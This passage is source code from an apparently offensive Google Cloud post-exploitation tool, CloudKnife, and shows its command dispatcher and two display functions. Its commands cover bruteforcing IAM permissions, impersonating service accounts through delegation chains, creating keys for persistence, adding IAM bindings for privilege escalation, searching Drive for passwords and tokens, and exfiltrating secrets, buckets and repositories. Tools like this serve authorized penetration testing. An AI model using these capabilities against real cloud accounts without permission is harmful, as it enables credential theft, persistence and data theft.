                # Enumerate Cloud Build triggers
                # Usage: enumerate_build_triggers
                enumerate_cloud_build_triggers(session_mgr)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_build_history":
                # Enumerate Cloud Build history
                # Usage: enumerate_build_history [max_builds]
                max_builds = int(args[0]) if args else 50
                enumerate_cloud_build_history(session_mgr, max_builds)
                _log_command(session_mgr, cmd)

            elif cmd == "describe_cloud_build":
                # Describe a specific Cloud Build with logs
                # Usage: describe_cloud_build [build_id] [project_id]
                build_id = args[0] if args else None
                project_id = args[1] if len(args) > 1 else None
                describe_cloud_build(session_mgr, build_id, project_id)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_sql":
                # Enumerate Cloud SQL instances
                # Usage: enumerate_sql
                enumerate_cloud_sql(session_mgr)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_objects":
                # Enumerate objects in a specific bucket
                # Usage: enumerate_objects <bucket> [prefix] [max_results]
                if not args:
                    console.print("[bold yellow]📦 Enumerate Bucket Objects[/bold yellow]")
                    bucket_name = Prompt.ask("[cyan]Bucket name[/cyan]")
                    prefix = Prompt.ask("[cyan]Prefix filter (optional, press Enter to skip)[/cyan]", default="")
                    prefix = prefix if prefix else None
                    max_results = 1000
                else:
                    bucket_name = args[0]
                    prefix = args[1] if len(args) > 1 else None
                    max_results = int(args[2]) if len(args) > 2 else 1000

                if bucket_name:
                    enumerate_bucket_objects(session_mgr, bucket_name, prefix, max_results)
                    _log_command(session_mgr, f"{cmd} {bucket_name}")
                else:
                    console.print("[red]Bucket name is required.[/red]")

            elif cmd == "enumerate_parameters":
                # Enumerate Parameter Manager parameters
                # Usage: enumerate_parameters [project_id]
                project_id = args[0] if args else None
                enumerate_parameters(session_mgr, project_id)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_secrets":
                # Enumerate Secret Manager secrets
                # Usage: enumerate_secrets [project_id]
                project_id = args[0] if args else None
                enumerate_secrets(session_mgr, project_id)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_source_repos":
                # Enumerate Google Source Repositories
                # Usage: enumerate_source_repos
                enumerate_source_repositories(session_mgr)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_artifacts":
                # Enumerate Artifact Registry repositories
                # Usage: enumerate_artifacts [project_id]
                project_id = args[0] if args else None
                enumerate_artifact_repositories(session_mgr, project_id)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_artifact_packages":
                # Enumerate packages in Artifact Registry repositories
                enumerate_artifact_packages(session_mgr)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_artifact_versions":
                # Enumerate versions and tags for packages
                enumerate_artifact_versions(session_mgr)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_drive":
                # Enumerate Google Drive files
                # Usage: enumerate_drive [query] [max_results]
                query = args[0] if args else None
                max_results = int(args[1]) if len(args) > 1 else 1000
                enumerate_drive_files(session_mgr, query=query, max_results=max_results, show_permissions=True)
                _log_command(session_mgr, cmd)

            elif cmd == "search_drive":
                # Search Google Drive for sensitive files
                # Usage: search_drive [keyword1] [keyword2] ...
                keywords = args if args else ['password', 'secret', 'key', 'token', 'credential']
                search_drive_files(session_mgr, keywords=keywords)
                _log_command(session_mgr, cmd)

            elif cmd == "list_shared_drive":
                # List shared Google Drive files
                # Usage: list_shared_drive [public_only]
                public_only = args[0].lower() == 'public' if args else False
                list_shared_files(session_mgr, publicly_shared=public_only)
                _log_command(session_mgr, cmd)

            elif cmd == "describe_drive_file":
                # Describe Google Drive file permissions
                # Usage: describe_drive_file <file_id>
                file_id = args[0] if args else None
                describe_file_permissions(session_mgr, file_id=file_id)
                _log_command(session_mgr, cmd)

            elif cmd == "download_drive_file":
                # Download a single Google Drive file
                # Usage: download_drive_file <file_id> [output_dir] [filename]
                if not args:
                    console.print("[red]Usage: download_drive_file <file_id> [output_dir] [filename][/red]")
                else:
                    file_id = args[0]
                    output_dir = args[1] if len(args) > 1 else "./drive_downloads"
                    filename = args[2] if len(args) > 2 else None
                    download_file(session_mgr, file_id, output_dir, filename)
                _log_command(session_mgr, cmd)

            elif cmd == "download_drive_files":
                # Download multiple Google Drive files from enumeration results
                # Usage: download_drive_files [output_dir] [max_workers]
                # Load enumeration results
                drive_files = session_mgr.get_enumeration_data("drive_files")
                if not drive_files:
                    console.print("[yellow]No enumeration results found. Run 'enumerate_drive' first.[/yellow]")
                else:
                    console.print(f"[cyan]Found {len(drive_files)} files in enumeration results[/cyan]")
                    if Confirm.ask(f"Download all {len(drive_files)} file(s)?", default=False):
                        output_dir = args[0] if args else "./drive_downloads"
                        max_workers = int(args[1]) if len(args) > 1 else 5
                        download_files_batch(session_mgr, drive_files, output_dir, max_workers)
                _log_command(session_mgr, cmd)

            elif cmd == "who_can_impersonate":
                # Get IAM policy for a service account (shows who can impersonate it)
                sa_email = args[0] if args else None
                get_service_account_iam_policy(session_mgr, sa_email)
                _log_command(session_mgr, cmd)

            elif cmd == "describe_role":
                # Describe an IAM role
                role_name = args[0] if args else None
                project_id = args[1] if len(args) > 1 else None
                describe_role(session_mgr, role_name, project_id)
                _log_command(session_mgr, cmd)

            elif cmd == "list_roles":
                # List predefined roles
                filter_pattern = args[0] if args else None
                list_predefined_roles(session_mgr, filter_pattern)
                _log_command(session_mgr, cmd)

            elif cmd == "bruteforce_permissions":
                # IAM permission bruteforce enumeration
                # Usage: bruteforce_permissions [services] [mode]
                # Examples:
                #   bruteforce_permissions           -> fast mode, all services
                #   bruteforce_permissions full      -> full mode, all services
                #   bruteforce_permissions low       -> low mode, all services
                #   bruteforce_permissions iam,compute fast -> specific services, fast mode
                services_arg = None
                mode = "fast"

                if args:
                    # Check if first arg is a mode
                    if args[0].lower() in ("fast", "full", "low"):
                        mode = args[0].lower()
                    else:
                        # First arg is services filter
                        services_arg = args[0]
                        # Second arg might be mode
                        if len(args) > 1 and args[1].lower() in ("fast", "full", "low"):
                            mode = args[1].lower()

                bruteforce_permissions(session_mgr, services_arg, mode)
                _log_command(session_mgr, f"{cmd} {mode}")

            elif cmd == "privesc_paths":
                # Analyze privilege escalation paths from bruteforce results
                show_privilege_escalation_paths(session_mgr)
                _log_command(session_mgr, cmd)

            # ---------- Lateral Movement ----------

            elif cmd == "map_impersonation":
                # Map the impersonation graph for service accounts
                project_id = args[0] if args else None
                map_impersonation_graph(session_mgr, project_id)
                _log_command(session_mgr, cmd)

            elif cmd == "find_chains":
                # Find delegation chains to a target service account
                target_sa = args[0] if args else None
                find_delegation_chains(session_mgr, target_sa)
                _log_command(session_mgr, cmd)

            elif cmd == "impersonate":
                # Impersonate a service account (optionally via delegation chain)
                # Usage: impersonate [target_sa] or impersonate chain <chain_number>
                if args and args[0].lower() == "chain":
                    # Use saved delegation chain
                    chain_idx = int(args[1]) if len(args) > 1 else None
                    if chain_idx:
                        impersonate_service_account(session_mgr, chain_index=chain_idx)
                    else:
                        console.print("[yellow]Usage: impersonate chain <chain_number>[/yellow]")
                else:
                    # Direct impersonation
                    target_sa = args[0] if args else None
                    impersonate_service_account(session_mgr, target_sa=target_sa)
                _log_command(session_mgr, cmd)

            elif cmd == "gen_token_curl":
                # Generate curl command for implicit delegation attack
                # Usage: gen_token_curl <target_sa> [delegate1,delegate2,...]
                if not args:
                    console.print("[bold yellow]🔧 Generate Token Curl Command[/bold yellow]")
                    target_sa = Prompt.ask("[cyan]Target service account email[/cyan]", default="")
                    delegates_str = Prompt.ask(
                        "[cyan]Delegates (comma-separated, empty for direct)[/cyan]",
                        default=""
                    )
                    delegates = [d.strip() for d in delegates_str.split(",") if d.strip()] if delegates_str else None
                else:
                    target_sa = args[0]
                    delegates = [d.strip() for d in args[1].split(",")] if len(args) > 1 else None

                if target_sa:
                    curl_cmd = generate_token_curl_command(target_sa, delegates)
                    console.print("\n[bold]Curl command for implicit delegation:[/bold]")
                    console.print(f"[dim]{curl_cmd}[/dim]")
                    console.print("\n[dim]Replace <YOUR_ACCESS_TOKEN> with: gcloud auth print-access-token[/dim]")
                else:
                    console.print("[red]Target service account is required.[/red]")
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_exploitable_sas":
                # Enumerate service accounts and test for exploitable permissions
                # Usage: enumerate_exploitable_sas [project_id] [sa_email_or_file]
                import os

                project_id = args[0] if args else None
                sa_input = args[1] if len(args) > 1 else None

                # If no SA input provided, ask user what they want to do
                if not sa_input:
                    # Check if we have cached enumerate_iam data
                    iam_data = session_mgr.enumerated_data.get(session_mgr.current_session, {}).get("iam_policies")
                    has_cached_sas = False
                    if iam_data:
                        has_cached_sas = bool(iam_data.get("service_accounts") or iam_data.get("project_policies"))

                    console.print("\n[bold blue]🎯 Service Account Discovery Method[/bold blue]\n")

                    options = []
                    if has_cached_sas:
                        options.append("Use enumerate_iam cached data (recommended)")
                    options.extend([
                        "Provide single SA email",
                        "Provide file with SA list (one per line)",
                        "Auto-discover via direct listing"
                    ])

                    console.print("How would you like to provide service accounts?\n")
                    for i, opt in enumerate(options, 1):
                        console.print(f"  {i}. {opt}")

                    choice = Prompt.ask("\n[cyan]Choose option[/cyan]", default="1")

                    try:
                        choice_num = int(choice)
                        selected_option = options[choice_num - 1] if 1 <= choice_num <= len(options) else options[0]

                        if "cached data" in selected_option:
                            # Use cached data - sa_input stays None
                            console.print("[green]Using cached enumerate_iam data[/green]\n")
                            sa_input = None
                        elif "single SA" in selected_option:
                            sa_email = Prompt.ask("[cyan]Service account email[/cyan]")
                            sa_input = sa_email if sa_email else None
                        elif "file with SA list" in selected_option:
                            file_path = Prompt.ask("[cyan]Path to SA list file[/cyan]")
                            sa_input = file_path if file_path else None
                        else:  # Auto-discover
                            console.print("[green]Using direct listing (requires iam.serviceAccounts.list)[/green]\n")
                            sa_input = None
                    except (ValueError, IndexError):
                        console.print("[yellow]Invalid choice, using default (cached data or auto-discover)[/yellow]\n")

                # Parse SA input (can be single email or file path)
                sa_list = None
                if sa_input:
                    if os.path.isfile(sa_input):
                        # Read SA list from file (one per line)
                        console.print(f"[dim]Reading service accounts from file: {sa_input}[/dim]")
                        try:
                            with open(sa_input, 'r') as f:
                                sa_list = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                            console.print(f"[dim]Loaded {len(sa_list)} service accounts from file[/dim]")
                        except Exception as e:
                            console.print(f"[red]Error reading file: {e}[/red]")
                            sa_list = None
                    else:
                        # Treat as single SA email
                        sa_list = [sa_input]

                enumerate_exploitable_sas(session_mgr, project_id, sa_list=sa_list)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_delegation_chains":
                # Enumerate implicit delegation by testing actual chains
                # Usage: enumerate_delegation_chains [project_id] [delegate_sa_or_file]
                import os

                project_id = args[0] if args else None
                delegate_input = args[1] if len(args) > 1 else None

                # If no delegate input provided, ask user what they want to do
                if not delegate_input:
                    # Check if we have cached enumerate_iam data
                    iam_data = session_mgr.enumerated_data.get(session_mgr.current_session, {}).get("iam_policies")
                    has_cached_sas = False
                    if iam_data:
                        has_cached_sas = bool(iam_data.get("service_accounts") or iam_data.get("project_policies"))

                    console.print("\n[bold blue]🔗 Delegation Chain Testing Method[/bold blue]\n")

                    options = []
                    if has_cached_sas:
                        options.append("Test all SAs from enumerate_iam cache as delegates (recommended)")
                    options.extend([
                        "Test specific delegate SA (provide email)",
                        "Test specific delegate SA (provide file - uses first SA)",
                        "Auto-discover all SAs and test as delegates"
                    ])

                    console.print("How would you like to test delegation chains?\n")
                    for i, opt in enumerate(options, 1):
                        console.print(f"  {i}. {opt}")

                    choice = Prompt.ask("\n[cyan]Choose option[/cyan]", default="1")

                    try:
                        choice_num = int(choice)
                        selected_option = options[choice_num - 1] if 1 <= choice_num <= len(options) else options[0]

                        if "enumerate_iam cache" in selected_option or "Auto-discover" in selected_option:
                            # Use cached data or auto-discover - delegate_input stays None (tests all SAs)
                            if "cache" in selected_option:
                                console.print("[green]Using cached enumerate_iam data[/green]\n")
                            else:
                                console.print("[green]Will auto-discover all SAs and test each as delegate[/green]\n")
                            delegate_input = None
                        elif "provide email" in selected_option:
                            sa_email = Prompt.ask("[cyan]Delegate service account email[/cyan]")
                            delegate_input = sa_email if sa_email else None
                        elif "provide file" in selected_option:
                            file_path = Prompt.ask("[cyan]Path to SA file (first SA will be used)[/cyan]")
                            delegate_input = file_path if file_path else None
                    except (ValueError, IndexError):
                        console.print("[yellow]Invalid choice, using default (test all SAs)[/yellow]\n")

                # Parse delegate input (can be single email or file path)
                delegate_sa = None
                if delegate_input:
                    if os.path.isfile(delegate_input):
                        # For now, delegation chains only supports single delegate
                        # Read first SA from file as delegate
                        console.print(f"[dim]Reading delegate SA from file: {delegate_input}[/dim]")
                        try:
                            with open(delegate_input, 'r') as f:
                                lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                                if lines:
                                    delegate_sa = lines[0]
                                    console.print(f"[dim]Using first SA from file as delegate: {delegate_sa}[/dim]")
                                    if len(lines) > 1:
                                        console.print(f"[dim yellow]Note: Only first SA from file will be used as delegate[/dim yellow]")
                        except Exception as e:
                            console.print(f"[red]Error reading file: {e}[/red]")
                            delegate_sa = None
                    else:
                        # Treat as single SA email
                        delegate_sa = delegate_input

                enumerate_delegation_chains(session_mgr, project_id, delegate_sa)
                _log_command(session_mgr, cmd)

            elif cmd == "enumerate_resource_permissions":
                # Enumerate permissions on a specific resource
                # Usage: enumerate_resource_permissions [type] [name] [project] [location/zone]
                resource_type = args[0] if args else None
                resource_name = args[1] if len(args) > 1 else None
                project_id = args[2] if len(args) > 2 else None
                loc_or_zone = args[3] if len(args) > 3 else None
                enumerate_resource_permissions(
                    session_mgr,
                    resource_type=resource_type,
                    resource_name=resource_name,
                    project_id=project_id,
                    location=loc_or_zone,
                    zone=loc_or_zone,
                )
                _log_command(session_mgr, cmd)

            elif cmd == "create_sa_key":
                # Create a new key for a service account (persistence)
                # Usage: create_sa_key [service_account_email]
                sa_email = args[0] if args else None
                create_sa_key(session_mgr, sa_email)
                _log_command(session_mgr, cmd)

            elif cmd == "list_sa_keys":
                # List keys for a service account
                # Usage: list_sa_keys [service_account_email]
                sa_email = args[0] if args else None
                list_sa_keys(session_mgr, sa_email)
                _log_command(session_mgr, cmd)

            elif cmd == "delete_sa_key":
                # Delete a service account key
                # Usage: delete_sa_key [service_account_email] [key_id]
                sa_email = args[0] if args else None
                key_id = args[1] if len(args) > 1 else None
                delete_sa_key(session_mgr, sa_email, key_id)
                _log_command(session_mgr, cmd)

            elif cmd == "sign_jwt":
                # Sign a JWT and exchange for access token
                # Usage: sign_jwt [service_account_email]
                sa_email = args[0] if args else None
                sign_jwt_for_access_token(session_mgr, sa_email)
                _log_command(session_mgr, cmd)

            elif cmd == "sign_jwt_batch":
                # Batch test signJwt on multiple SAs using delegation chain
                # Usage: sign_jwt_batch [delegate_sa_email]
                delegate = args[0] if args else None
                sign_jwt_batch(session_mgr, delegate=delegate)
                _log_command(session_mgr, cmd)

            elif cmd == "sign_blob":
                # Sign arbitrary data as a service account
                # Usage: sign_blob [service_account_email]
                sa_email = args[0] if args else None
                sign_blob(session_mgr, sa_email)
                _log_command(session_mgr, cmd)

            elif cmd == "get_sa_iam_policy":
                # Get IAM policy for a service account
                # Usage: get_sa_iam_policy [service_account_email]
                sa_email = args[0] if args else None
                get_sa_iam_policy(session_mgr, sa_email)
                _log_command(session_mgr, cmd)

            elif cmd == "set_sa_iam_policy":
                # Add a binding to a service account's IAM policy (privilege escalation)
                # Usage: set_sa_iam_policy [service_account_email] [member] [role]
                sa_email = args[0] if args else None
                member = args[1] if len(args) > 1 else None
                role = args[2] if len(args) > 2 else None
                set_sa_iam_policy(session_mgr, sa_email, member, role)
                _log_command(session_mgr, cmd)

            elif cmd == "remove_sa_iam_binding":
                # Remove a binding from a service account's IAM policy
                # Usage: remove_sa_iam_binding [service_account_email] [member] [role]
                sa_email = args[0] if args else None
                member = args[1] if len(args) > 1 else None
                role = args[2] if len(args) > 2 else None
                remove_sa_iam_binding(session_mgr, sa_email, member, role)
                _log_command(session_mgr, cmd)

            elif cmd == "impersonate_jwt":
                # Impersonate using self-signed JWT (no getAccessToken permission needed)
                # Usage: impersonate_jwt [--template id] [--interactive] [--sa-key path] [--claims-file path] [--scopes scope1,scope2] [--audience url] [--subject email]
                # Parse arguments
                sa_key_file = None
                claims_file = None
                scopes = None
                audience = None
                subject_email = None
                template_id = None
                interactive = False

                i = 0
                while i < len(args):
                    if args[i] == "--sa-key" and i + 1 < len(args):
                        sa_key_file = args[i + 1]
                        i += 2
                    elif args[i] == "--claims-file" and i + 1 < len(args):
                        claims_file = args[i + 1]
                        i += 2
                    elif args[i] == "--scopes" and i + 1 < len(args):
                        scopes = args[i + 1].split(",")
                        i += 2
                    elif args[i] == "--audience" and i + 1 < len(args):
                        audience = args[i + 1]
                        i += 2
                    elif args[i] == "--subject" and i + 1 < len(args):
                        subject_email = args[i + 1]
                        i += 2
                    elif args[i] == "--template" and i + 1 < len(args):
                        template_id = args[i + 1]
                        i += 2
                    elif args[i] == "--interactive":
                        interactive = True
                        i += 1
                    else:
                        i += 1

                impersonate_with_jwt(
                    session_mgr,
                    sa_key_file=sa_key_file,
                    claims_file=claims_file,
                    scopes=scopes,
                    audience=audience,
                    subject_email=subject_email,
                    template_id=template_id,
                    interactive=interactive,
                )
                _log_command(session_mgr, cmd)

            elif cmd == "generate_jwt":
                # Generate a self-signed JWT without exchanging for token
                # Usage: generate_jwt [--sa-key path] [--claims-file path] [--scopes scope1,scope2] [--audience url]
                sa_key_file = None
                claims_file = None
                scopes = None
                audience = None

                i = 0
                while i < len(args):
                    if args[i] == "--sa-key" and i + 1 < len(args):
                        sa_key_file = args[i + 1]
                        i += 2
                    elif args[i] == "--claims-file" and i + 1 < len(args):
                        claims_file = args[i + 1]
                        i += 2
                    elif args[i] == "--scopes" and i + 1 < len(args):
                        scopes = args[i + 1].split(",")
                        i += 2
                    elif args[i] == "--audience" and i + 1 < len(args):
                        audience = args[i + 1]
                        i += 2
                    else:
                        i += 1

                jwt_token = generate_signed_jwt(
                    session_mgr,
                    sa_key_file=sa_key_file,
                    claims_file=claims_file,
                    scopes=scopes,
                    audience=audience,
                )

                if jwt_token:
                    console.print(f"\n[bold green]JWT Token:[/bold green]")
                    console.print(f"{jwt_token}\n")
                _log_command(session_mgr, cmd)

            elif cmd == "exchange_jwt":
                # Exchange a JWT for an OAuth access token
                # Usage: exchange_jwt <jwt_token>
                if not args:
                    console.print("[yellow]Usage: exchange_jwt <jwt_token>[/yellow]")
                    console.print("[dim]Or paste the JWT when prompted:[/dim]")
                    jwt_token = Prompt.ask("[cyan]JWT token[/cyan]")
                else:
                    jwt_token = args[0]

                if jwt_token:
                    token_data = exchange_jwt_for_token(jwt_token)
                    if token_data:
                        console.print(f"\n[bold green]Access Token:[/bold green]")
                        console.print(f"{token_data.get('access_token')}\n")
                _log_command(session_mgr, cmd)

            elif cmd == "show_jwt_templates":
                # Show available JWT templates for common scenarios
                show_jwt_templates()
                _log_command(session_mgr, cmd)

            # ---------- Exfiltration ----------

            elif cmd == "clone_source_repo":
                # Clone a single Source Repository
                # Usage: clone_source_repo [repo_name] [project_id] [output_dir]
                repo_name = args[0] if args else None
                project_id = args[1] if len(args) > 1 else None
                output_dir = args[2] if len(args) > 2 else None

                clone_source_repository(session_mgr, repo_name, project_id, output_dir)
                _log_command(session_mgr, f"{cmd} {repo_name or 'interactive'}")

            elif cmd == "clone_all_source_repos":
                # Clone all Source Repositories from a project
                # Usage: clone_all_source_repos [project_id] [output_base_dir]
                project_id = args[0] if args else None
                output_base_dir = args[1] if len(args) > 1 else None

                clone_all_source_repositories(session_mgr, project_id, output_base_dir)
                _log_command(session_mgr, f"{cmd} {project_id or 'all_projects'}")

            elif cmd == "download_object":
                # Download a single object from a bucket
                # Usage: download_object <bucket> <object> [output_path]
                if not args:
                    console.print("[bold yellow]📥 Download Object[/bold yellow]")
                    bucket_name = Prompt.ask("[cyan]Bucket name[/cyan]")
                    object_name = Prompt.ask("[cyan]Object path/name[/cyan]")
                    output_path = Prompt.ask(
                        "[cyan]Output path (optional, press Enter for default)[/cyan]",
                        default=""
                    )
                    output_path = output_path if output_path else None
                else:
                    bucket_name = args[0]
                    object_name = args[1] if len(args) > 1 else None
                    output_path = args[2] if len(args) > 2 else None

                if bucket_name and object_name:
                    download_object(session_mgr, bucket_name, object_name, output_path)
                    _log_command(session_mgr, f"{cmd} {bucket_name}/{object_name}")
                else:
                    console.print("[red]Bucket name and object name are required.[/red]")

            elif cmd == "exfil_bucket":
                # Download all objects from a bucket
                # Usage: exfil_bucket <bucket> [prefix] [max_objects] [max_size_mb]
                if not args:
                    console.print("[bold yellow]📦 Exfiltrate Bucket[/bold yellow]")
                    bucket_name = Prompt.ask("[cyan]Bucket name[/cyan]")
                    prefix = Prompt.ask(
                        "[cyan]Prefix filter (optional, press Enter to skip)[/cyan]",
                        default=""
                    )
                    prefix = prefix if prefix else None
                    max_objects = int(Prompt.ask("[cyan]Max objects[/cyan]", default="1000"))
                    max_size_mb = int(Prompt.ask("[cyan]Max total size (MB)[/cyan]", default="100"))
                else:
                    bucket_name = args[0]
                    prefix = args[1] if len(args) > 1 and args[1] != "-" else None
                    max_objects = int(args[2]) if len(args) > 2 else 1000
                    max_size_mb = int(args[3]) if len(args) > 3 else 100

                if bucket_name:
                    download_all_objects(
                        session_mgr,
                        bucket_name,
                        prefix=prefix,
                        max_objects=max_objects,
                        max_size_mb=max_size_mb,
                    )
                    _log_command(session_mgr, f"{cmd} {bucket_name}")
                else:
                    console.print("[red]Bucket name is required.[/red]")

            elif cmd == "exfil_parameters":
                # Exfiltrate all parameters from Parameter Manager
                # Usage: exfil_parameters [project_id]
                project_id = args[0] if args else None
                exfil_parameters(session_mgr, project_id)
                _log_command(session_mgr, cmd)

            elif cmd == "exfil_parameter":
                # Exfiltrate a single parameter
                # Usage: exfil_parameter <name> [project_id] [location] [version]
                if not args:
                    console.print("[bold yellow]🔑 Exfiltrate Single Parameter[/bold yellow]")
                    param_name = Prompt.ask("[cyan]Parameter name[/cyan]")
                    project_id = Prompt.ask(
                        "[cyan]Project ID[/cyan]",
                        default=session_mgr.current_session_data.get("project_id", "")
                    )
                    location = Prompt.ask("[cyan]Location[/cyan]", default="global")
                    version = Prompt.ask("[cyan]Version[/cyan]", default="latest")
                else:
                    param_name = args[0]
                    project_id = args[1] if len(args) > 1 else None
                    location = args[2] if len(args) > 2 else "global"
                    version = args[3] if len(args) > 3 else "latest"

                if param_name:
                    exfil_single_parameter(session_mgr, param_name, project_id, location, version)
                    _log_command(session_mgr, f"{cmd} {param_name}")
                else:
                    console.print("[red]Parameter name is required.[/red]")

            elif cmd == "exfil_secrets":
                # Exfiltrate all secrets from Secret Manager
                # Usage: exfil_secrets [project_id]
                project_id = args[0] if args else None
                exfil_secrets(session_mgr, project_id)
                _log_command(session_mgr, cmd)

            elif cmd == "exfil_secret":
                # Exfiltrate a single secret
                # Usage: exfil_secret <name> [project_id] [version] [location]
                if not args:
                    console.print("[bold yellow]🔑 Exfiltrate Single Secret[/bold yellow]")
                    secret_name = Prompt.ask("[cyan]Secret name[/cyan]")
                    project_id = Prompt.ask(
                        "[cyan]Project ID[/cyan]",
                        default=session_mgr.current_session_data.get("project_id", "")
                    )
                    version = Prompt.ask("[cyan]Version[/cyan]", default="latest")
                    location = Prompt.ask(
                        "[cyan]Location (leave empty for global)[/cyan]",
                        default=""
                    )
                    location = location if location else None
                else:
                    secret_name = args[0]
                    project_id = args[1] if len(args) > 1 else None
                    version = args[2] if len(args) > 2 else "latest"
                    location = args[3] if len(args) > 3 else None

                if secret_name:
                    exfil_single_secret(session_mgr, secret_name, project_id, version, location)
                    _log_command(session_mgr, f"{cmd} {secret_name}")
                else:
                    console.print("[red]Secret name is required.[/red]")

            elif cmd == "download_artifact":
                # Download artifact from Artifact Registry (Docker images, etc.)
                download_artifact(session_mgr)
                _log_command(session_mgr, cmd)

            # ---------- Unknown command ----------

            else:
                console.print(f"[yellow]Unknown command: {cmd}. Type 'help' for available commands.[/yellow]")

        except KeyboardInterrupt:
            console.print("\n[dim]Use 'exit' to quit or 'cloud' to switch providers.[/dim]")
            continue

        except EOFError:
            return "exit"


def _show_config(session_mgr: GCPSessionManager) -> None:
    """Display current session configuration."""
    from rich.table import Table

    data = session_mgr.current_session_data

    table = Table(title="GCP Session Configuration")
    table.add_column("Setting", style="cyan")
    table.add_column("Value")

    table.add_row("Session Name", session_mgr.current_session or "N/A")
    table.add_row("Session ID", data.get("session_id", "N/A"))
    table.add_row("Auth Method", data.get("auth_method") or "[red]Not configured[/red]")

    if data.get("auth_method") == "service_account":
        table.add_row("SA Key File", data.get("service_account_file", "N/A"))
        table.add_row("Service Account", data.get("service_account_email", "N/A"))
    elif data.get("auth_method") == "adc":
        table.add_row("Auth Source", "Application Default Credentials")
    elif data.get("auth_method") == "access_token":
        # Check if this is an impersonated session
        impersonated_sa = data.get("impersonated_sa")
        impersonated_from = data.get("impersonated_from")
        delegation_chain = data.get("delegation_chain")

        if impersonated_sa:
            table.add_row("Auth Source", "[magenta]Impersonated Token[/magenta]")
            table.add_row("Service Account", f"[green]{impersonated_sa}[/green]")
            if impersonated_from:
                table.add_row("Impersonated From", f"[dim]{impersonated_from}[/dim]")
            if delegation_chain:
                table.add_row("Delegation Chain", " → ".join(delegation_chain))
        else:
            table.add_row("Auth Source", "[yellow]Raw Access Token[/yellow]")

        # Show token preview (first/last chars for safety)
        token = data.get("access_token", "")
        if token:
            preview = f"{token[:8]}...{token[-8:]}" if len(token) > 20 else "[set]"
            table.add_row("Token Preview", f"[dim]{preview}[/dim]")

    table.add_row("Default Project", data.get("project_id") or "[yellow]Not set[/yellow]")

    projects = data.get("projects", [])
    if projects:
        table.add_row("Projects List", ", ".join(projects))
    else:
        table.add_row("Projects List", "[dim](auto-discover all)[/dim]")

    table.add_row("Default Zone", data.get("default_zone", "us-central1-a"))

    zones = data.get("zones", [])
    if zones:
        table.add_row("Zones List", ", ".join(zones))
    else:
        table.add_row("Zones List", "[dim](all zones)[/dim]")

    console.print(table)


def _whoami(session_mgr: GCPSessionManager) -> None:
    """Show current identity information + bruteforce permissions summary."""
    from collections import defaultdict
    from rich.table import Table

    credentials = session_mgr.get_credentials()
    if not credentials:
        console.print("[red]No credentials configured. Use 'set_credentials', 'set_adc', or 'set_token'.[/red]")
        return

    data = session_mgr.current_session_data

    # --- Identity Table ---
    id_table = Table(title=f"GCP Identity - Session: {session_mgr.current_session}")
    id_table.add_column("Attribute", style="cyan")
    id_table.add_column("Value")

    # Session info
    if session_mgr.session_id:
        id_table.add_row("CloudKnife Session ID", f"[dim]{session_mgr.session_id}[/dim]")

    # Auth method
    auth_method = data.get("auth_method")
    if auth_method == "service_account":
        id_table.add_row("Auth Method", "[green]Service Account Key[/green]")
        id_table.add_row("Service Account", data.get("service_account_email", "N/A"))
        id_table.add_row("Key File", data.get("service_account_file", "N/A"))
    elif auth_method == "adc":
        id_table.add_row("Auth Method", "[cyan]Application Default Credentials[/cyan]")
        sa_email = data.get("service_account_email")
        if sa_email:
            id_table.add_row("Identity", sa_email)
    elif auth_method == "access_token":
        # Check if this is an impersonated session
        impersonated_sa = data.get("impersonated_sa")
        impersonated_from = data.get("impersonated_from")
        delegation_chain = data.get("delegation_chain")

        if impersonated_sa:
            id_table.add_row("Auth Method", "[magenta]Impersonated Token[/magenta]")
            id_table.add_row("Service Account", f"[bold green]{impersonated_sa}[/bold green]")
            if impersonated_from:
                id_table.add_row("Impersonated From", f"[dim]{impersonated_from}[/dim]")
            if delegation_chain:
                chain_str = " → ".join(delegation_chain)
                id_table.add_row("Delegation Chain", f"[yellow]{chain_str}[/yellow]")
        else:
            id_table.add_row("Auth Method", "[yellow]Access Token[/yellow]")

        # Try to get identity from token info
        token_info = session_mgr.get_token_info()
        if token_info and "error" not in token_info:
            # Only show email if not already showing impersonated_sa
            if token_info.get("email") and not impersonated_sa:
                id_table.add_row("Identity", token_info.get("email"))
            if token_info.get("expires_in"):
                expires_in = int(token_info.get("expires_in", 0))
                if expires_in > 0:
                    mins = expires_in // 60
                    secs = expires_in % 60
                    id_table.add_row("Token Expires", f"[yellow]{mins}m {secs}s[/yellow]")
                else:
                    id_table.add_row("Token Expires", "[red]EXPIRED[/red]")
            if token_info.get("scope"):
                scopes = token_info.get("scope", "").split()
                id_table.add_row("Scopes", f"{len(scopes)} scope(s)")
        else:
            id_table.add_row("Token Status", "[red]Could not verify[/red]")
    else:
        id_table.add_row("Auth Method", "[red]Not configured[/red]")

    # Project info
    project = data.get("project_id")
    id_table.add_row("Default Project", project if project else "[yellow]Not set[/yellow]")

    # Projects list
    projects = data.get("projects", [])
    if projects:
        id_table.add_row("Projects List", ", ".join(projects))
    else:
        id_table.add_row("Projects List", "[dim](auto-discover all)[/dim]")

    # Zones
    zones = data.get("zones", [])
    if zones:
        id_table.add_row("Zones List", ", ".join(zones[:5]) + ("..." if len(zones) > 5 else ""))
    else:
        id_table.add_row("Zones List", "[dim](all zones)[/dim]")

    console.print(id_table)

    # --- Permissions summary from bruteforce_permissions ---
    bruteforce_data = (
        session_mgr.enumerated_data.get(session_mgr.current_session, {}).get("iam_bruteforce")
        if session_mgr.current_session in session_mgr.enumerated_data
        else None
    )

    if not bruteforce_data:
        console.print(
            "\n[yellow]No bruteforce permission data found for this session. "
            "Run 'bruteforce_permissions' to enumerate allowed actions.[/yellow]"
        )
        return

    # Extract granted permissions by service
    all_granted = bruteforce_data.get("all_granted", [])
    by_service = bruteforce_data.get("by_service", {})
    dangerous_found = bruteforce_data.get("dangerous_found", [])
    total_tested = bruteforce_data.get("total_tested", 0)
    mode = bruteforce_data.get("mode", "unknown")

    # Build permissions table
    perm_table = Table(
